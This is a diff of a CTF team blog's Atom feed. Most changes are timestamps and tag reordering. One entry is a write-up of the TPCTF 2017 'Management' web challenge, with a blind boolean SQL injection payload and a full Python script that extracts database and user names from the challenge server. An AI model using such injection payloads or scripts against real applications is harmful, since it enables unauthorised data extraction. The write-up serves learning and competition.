@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://teamrocketist.github.io/"/>
-  <updated>2017-12-04T05:24:01.189Z</updated>
+  <updated>2017-12-04T05:36:34.611Z</updated>
   <id>https://teamrocketist.github.io/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-Management/"/>
     <id>https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-Management/</id>
     <published>2017-12-04T05:20:20.000Z</published>
-    <updated>2017-12-04T05:24:01.189Z</updated>
+    <updated>2017-12-04T05:36:34.611Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>Management<br>60<br><br>I’ve created a new website so you can do all your important management. It includes users, creating things, reading things, and… well, not much else. Maybe there’s a flag?<br><br>Second instance running at 52.90.229.46:8558<br><br>tpctf{san1t1z3_y0ur_1npu7s} is not the correct flag. Look harder ;)<br>Note: the flag format is flag{}, not the usual tpctf{}<br><br>Author: Kevin Higgs<br><br></blockquote>
 
@@ -28,7 +28,7 @@
 <p>After doing this its shown a new form where we could read/insert into the columns data from the table users from the current user:<br><a data-fancybox="gallery" href="https://i.imgur.com/vo6FqwU.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/vo6FqwU.png" alt=""><br></a><br>We can see which <strong>sql query</strong> is being executed:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="string">`1`</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">name</span> = <span class="string">'custom-kevin'</span>;Result: 1</div></pre></td></tr></table></figure>
 <p>It’s shown in the website! all inputs are being sanitized for the exception of the POST parameter number! I used Blind Sql injection to do this challenge (Boolean Based) the base payload I used was</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1`=1, 1`=if((<span class="keyword">SELECT</span> <span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'Abc'</span>,<span class="number">1</span>,<span class="number">1</span>)))=<span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'A'</span>,<span class="number">1</span>,<span class="number">1</span>)),<span class="string">`1`</span>, <span class="string">'False'</span>), <span class="string">`1</span></div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1`=if((<span class="keyword">SELECT</span> <span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'Abc'</span>,<span class="number">1</span>,<span class="number">1</span>)))=<span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'A'</span>,<span class="number">1</span>,<span class="number">1</span>)),<span class="string">`1`</span>, <span class="string">'False'</span>), <span class="string">`1</span></div></pre></td></tr></table></figure>
 <p>It’s important to use <code>HEX</code> function because substring is case insensitive and would return wrong queries if we didn’t use it, notice that what is going to be shown in the page is the result of the comparison we are making in the sql query so if the comparison is true our query will show in the page <strong>Result: 1</strong> if it’s false it will return <strong>Result: 0</strong>, doing this by hand is tedious so I wrote a python script to automate the stuff:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">url=<span class="string">'http://52.90.229.46:8558'</span></div><div class="line">TABLE_NAME = <span class="string">'SELECT hex(substring(table_name,1,%d)) FROM information_schema.tables WHERE table_schema=database() limit %d,1'</span></div><div class="line">SUBSTRING_HEX_NAME = <span class="string">"hex(substring('&#123;&#125;',1,&#123;&#125;))"</span></div><div class="line">USERS_NAME = <span class="string">'SELECT hex(substring(name,1,%d)) FROM users limit %d,1'</span></div><div class="line"></div><div class="line">name = <span class="string">''</span></div><div class="line">cookie = &#123;<span class="string">'user'</span>: <span class="string">'kevin'</span>&#125;</div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</div><div class="line">    name = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>+<span class="number">1</span>):</div><div class="line">        stop = <span class="keyword">True</span></div><div class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> string.printable:</div><div class="line">            PAYLOAD = <span class="string">"1`=if((%s)=%s,`1`, 'False'),`9"</span> % (USERS_NAME%(i,j), SUBSTRING_HEX_NAME.format(name+l,i))<span class="comment">#SUBSTRING_NAME.format(name+l, i))</span></div><div class="line">            <span class="comment">#print PAYLOAD</span></div><div class="line">            r = requests.post(url, data=&#123;<span class="string">'number'</span>:<span class="string">'%s'</span>%PAYLOAD,<span class="string">'action'</span>:<span class="string">'Read'</span>, <span class="string">'value'</span>:<span class="string">''</span>&#125;, cookies=cookie, timeout=<span class="number">6</span>)</div><div class="line">            </div><div class="line">            <span class="keyword">if</span> <span class="string">'Result: 1'</span> <span class="keyword">in</span> r.text:</div><div class="line">                <span class="comment">#print '-----------------------------------'</span></div><div class="line">                name += l</div><div class="line">                <span class="keyword">print</span> name</div><div class="line">                stop = <span class="keyword">False</span></div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> stop:        </div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="comment">#if(1=1,sleep(6),0)</span></div></pre></td></tr></table></figure>
 <p>Running it</p>
@@ -338,9 +338,9 @@ array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class=
     
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
-      <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
-    
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
+    
+      <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
     
   </entry>
   
@@ -800,9 +800,9 @@ d = []
     
       <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
       <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
   </entry>
   
@@ -853,8 +853,6 @@ d = []
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
       <category term="ROP" scheme="https://teamrocketist.github.io/tags/ROP/"/>
@@ -862,6 +860,8 @@ d = []
       <category term="retToLibc" scheme="https://teamrocketist.github.io/tags/retToLibc/"/>
     
       <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
   </entry>
   
@@ -992,9 +992,9 @@ d = []
     
       <category term="stackcanary" scheme="https://teamrocketist.github.io/tags/stackcanary/"/>
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
   </entry>
   
